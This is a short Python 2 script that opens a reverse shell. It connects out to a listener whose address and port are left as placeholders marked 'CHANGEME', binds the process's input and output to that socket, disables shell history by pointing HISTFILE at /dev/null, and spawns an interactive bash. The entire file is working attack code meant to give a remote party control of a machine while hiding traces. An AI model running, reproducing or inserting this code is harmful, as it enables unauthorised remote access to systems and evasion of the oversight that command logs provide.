#!/usr/bin/python2
import os
import pty
import socket

lhost = "127.0.0.1" # XXX: CHANGEME
lport = 31337 # XXX: CHANGEME

def run():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((lhost, lport))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    os.putenv("HISTFILE",'/dev/null')
    pty.spawn("/bin/bash")
    s.close()
    
    
	

